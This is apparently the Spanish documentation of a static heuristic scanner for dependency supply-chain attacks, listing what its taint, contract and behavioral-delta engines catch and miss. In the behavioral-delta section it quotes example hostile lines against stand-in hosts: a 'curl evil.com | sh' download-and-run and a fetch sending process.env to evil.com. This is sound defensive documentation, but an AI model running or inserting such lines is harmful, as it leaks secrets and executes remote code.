# SecOps Scanner — Análisis de Fiabilidad

Este documento describe honestamente qué detecta el scanner con fiabilidad, qué puede pasar por alto, y en qué contextos **no debe usarse como garantía única** de seguridad.

---

## Qué tipo de análisis realiza el scanner

El scanner es un **analizador heurístico estático**, no un analizador formal. La distinción importa:

| Propiedad | Análisis formal | Este scanner |
|---|---|---|
| Garantía de ausencia | Puede probar ausencia | **No puede** |
| Interprocedural | Completo (con limitaciones) | **No** — análisis por archivo |
| Semántica real | Evalúa valores y tipos | **No** — detecta patrones de nombres |
| JS coverage | AST completo | **Parcial** — parser propio |
| Falsos negativos | Teóricamente minimizables | **Documentados** abajo |

El scanner complementa una postura de seguridad; no la reemplaza.

---

## Motor 1: Taint Analyzer

### Qué detecta con fiabilidad

- Flujo `config.url → request.open` en la misma función o en ventana de ≤30 líneas
- Flujo `process.env → fetch/exec` sin sanitización intermedia en la misma ventana
- Flujo `req.body → eval/exec/innerHTML` sin transformación entre source y sink
- **CVE cubiertos con tests de integración**: CVE-2025-27152 (axios SSRF), CVE-2025-58754 (DoS via data: URI)

### Falsos negativos documentados

1. **Flujo interprocedural**: si el source se asigna en una función y el sink está en otra, el motor no cruza el límite de función. Ejemplo:
   ```js
   // módulo A
   function getUrl(config) { return config.url; }

   // módulo B — el taint analyzer NO conecta estos dos
   function doRequest(url) { fetch(url); }
   ```

2. **Variables intermedias**: si el source se transforma antes del sink, el motor puede no trazar la cadena completa:
   ```js
   var u = config.url;
   var processed = transform(u);  // se pierde el taint aquí
   fetch(processed);              // puede no detectar
   ```

3. **Flujo entre archivos**: análisis por archivo. Un source en `config.js` que fluye a un sink en `request.js` no se detecta.

4. **Cobertura JS limitada**: el parser JavaScript propio cubre construcciones ES5/ES6 comunes. Puede fallar con:
   - Optional chaining (`?.`)
   - Nullish coalescing (`??`)
   - Destructuring complejo
   - Generators y async/await en formas no convencionales

### Falsos positivos documentados

1. Código de test o mocks que contienen los patrones source/sink sin ser código de producción real.
2. Wrappers de seguridad que contienen los patrones precisamente para sanitizar (el motor detecta presencia, no semántica de sanitización efectiva).

---

## Motor 2: Contract Verifier

### Qué detecta con fiabilidad

- Opciones de configuración con prefijo de restricción (`allow*`, `max*`, `limit*`, `restrict*`, `safe*`, `block*`) que **no aparecen verificadas** en algún code path que ejecuta la operación que dicen restringir
- **CVE cubiertos**: opciones ignoradas en adapters secundarios (XHR vs HTTP), `maxContentLength` no aplicado en path data: URI

### Falsos negativos documentados

1. **Verificación inefectiva**: si el código verifica la opción pero no aplica el límite correctamente, el motor no lo detecta:
   ```js
   if (options.maxContentLength) {  // ✓ verificado
     // pero no se aplica ningún rechazo
   }
   ```

2. **Opciones con nombres no estándar**: si la opción usa un nombre que no sigue los prefijos del motor (`max*`, `allow*`, etc.), no se detecta. Ejemplo: `options.sizeThreshold` no es detectado.

3. **Validación fuera del código descargado**: si la restricción se aplica en el wrapper del proyecto que llama a la librería, no en la librería misma, el motor lo marca como violación cuando no lo es.

### Falsos positivos documentados

1. Opciones que existen solo para configuración de logging o metadata, no para restricciones de seguridad, pero tienen prefijo `max*` o `limit*`.
2. Code paths que son código muerto o legacy mantenido solo por compatibilidad.

---

## Motor 3: Behavioral Delta

### Qué detecta con fiabilidad

- Nuevas llamadas a `fetch`, `XMLHttpRequest.open`, `http.request` → `CRITICAL`
- Nuevas llamadas a `exec`, `spawn`, `child_process` → `CRITICAL`
- Nuevo acceso a `process.env`, `os.environ` → `HIGH`
- Nueva escritura a filesystem → `HIGH`
- **Caso real cubierto con test**: axios@1.14.1 RAT que introducía `fetch('evil.attacker.com')` + `exec('curl evil.com | sh')`

### Falsos negativos documentados

1. **Ataques que reutilizan operaciones existentes**: si la versión original ya tenía una llamada a `fetch` y el ataque solo cambia la URL/destino, el motor no detecta el cambio (no hay edge nuevo en el call graph, solo el argumento cambió):
   ```js
   // v1.0 (limpio)
   fetch(config.url);

   // v1.1 (comprometido — misma llamada, argumento diferente)
   fetch('https://evil.com/exfil?d=' + JSON.stringify(process.env));
   ```

2. **Ataques a través de eval**: `eval(atob('...'))` introduce código ejecutable sin añadir edges reconocibles al call graph.

3. **Ataques en código de inicialización**: código que se ejecuta al importar el módulo (top-level) puede no ser capturado en el call graph si el parser no lo atribuye a una función.

4. **Comparación de versiones no consecutivas**: el motor compara dos versiones específicas. Un ataque introducido en v1.0.5 y parchado en v1.0.7 no se detecta si se compara v1.0.3 con v1.0.8.

### Falsos positivos documentados

1. Fixes de seguridad legítimos que añaden validación de red (ej: verificar un OCSP endpoint nuevo) pueden reportarse como CRITICAL aunque sean defensivos. El contexto manual es necesario para distinguir.
2. Refactorizaciones que mueven código de red a nuevas funciones añaden edges aunque el comportamiento neto sea idéntico.

---

## Parser JavaScript

El parser JavaScript es una implementación propia (~130 líneas). **No es un parser de producción.**
La cobertura del módulo `ast_engine.py` es del 100% (tests de integración verificados 2026-04-05).

### Cobertura confirmada (con test de integración)
- Declaraciones de función (`function foo() {}`)
- Arrow functions y const functions (`const fn = () => {}`, `const handler = async (req, res) => {}`)
- ES6 imports (`import React from 'react'`, `import { useState } from 'react'`)
- CommonJS require (`const axios = require('axios')`)
- Llamadas a métodos (`obj.method()`, `require('x').method()`)
- Asignaciones simples
- Bloques `if/else`, `try/catch`, `for/while`
- Manejo de errores: archivo no legible → `ParseResult(parse_error=...)` sin excepción
- Lenguaje no soportado → `ParseResult(parse_error="Lenguaje no soportado: X")`

### Cobertura no garantizada
- Optional chaining (`obj?.method?.()`)
- Template literals con expresiones complejas
- Destructuring en parámetros (`function({url, method})`)
- Dynamic imports (`import()`)
- Proxy/Reflect
- Código minificado o transpilado (Webpack, esbuild output)

Para proyectos que transpilan su código antes de publicar en npm, la cobertura efectiva del análisis JS puede reducirse significativamente.

---

## Fetcher: Garantías de Integridad

El fetcher es el componente más robusto del sistema:

| Amenaza | Mecanismo | Garantía |
|---|---|---|
| Tarball con hash manipulado | SHA-256 verificado antes de escribir | **Fuerte** |
| Symlinks en tarball | `_verify_tar_members` antes de `extractall()` | **Fuerte** |
| Path traversal en tarball | Resolución de paths vs destino | **Fuerte** |
| Path traversal en zip | `_verify_zip_members` antes de extraer | **Fuerte** |
| Re-descarga de dependencia limpia | Cache check antes de red | **Fuerte** |

El fetcher tiene cobertura del 86% con tests de seguridad que usan artefactos reales (no mocks). Los paths de descarga real de red (PyPI/npm) están excluidos por diseño — son la frontera del sistema.

**Limitación**: solo soporta PyPI (sdist) y npm (tarball). Dependencias de Cargo, Go modules, Maven, etc. no se descargan ni analizan.

---

## Cuándo usar este scanner

### Casos de uso apropiados

1. **Screening inicial** de dependencias en un pipeline CI antes de auditoría manual
2. **Detección de supply chain attacks** con comportamiento nuevo visible (nuevas llamadas de red/procesos)
3. **Trazabilidad de hallazgos**: el JSONL append-only proporciona evidencia para responsible disclosure
4. **Comparación between versions** al actualizar dependencias
5. **Equipos sin acceso a herramientas comerciales** que necesitan un primer nivel de análisis local y offline

### Contextos donde NO es garantía suficiente

1. **Solo criterio de aprobación** de dependencias en sistemas de alta criticidad (financiero, médico, infraestructura)
2. **Detección de vulnerabilidades lógicas** complejas no reducibles a patrones de nombres
3. **Código JS moderno transpilado** donde el parser puede no alcanzar cobertura adecuada
4. **Flujos interprocedurales** multi-archivo en librerías grandes (>10k LOC por archivo de análisis)
5. **Garantía de ausencia**: un resultado CLEAN significa "no detecté patrones conocidos", no "ausencia de vulnerabilidades"

---

## Recomendación de uso en producción

```
SecOps Scanner (este módulo)
        ↓
    COMPLEMENTAR con
        ↓
├── Auditoría humana para hallazgos CRITICAL/HIGH
├── npm audit / pip-audit para CVEs en bases de datos públicas
└── Revisión manual de changelogs al actualizar versiones mayores
```

Un resultado CLEAN de este scanner **no descarta** vulnerabilidades que:
- Requieren análisis interprocedural completo
- Están en patrones no cubiertos por los motores actuales
- Existen en código JS transpilado que el parser no alcanza
- Son lógicas de negocio incorrectas sin manifestación en patrones de nombres

Un resultado CRITICAL/HIGH de este scanner **sí requiere** revisión manual — no como confirmación automática, sino porque el patrón detectado es suficientemente sospechoso para justificar atención humana.
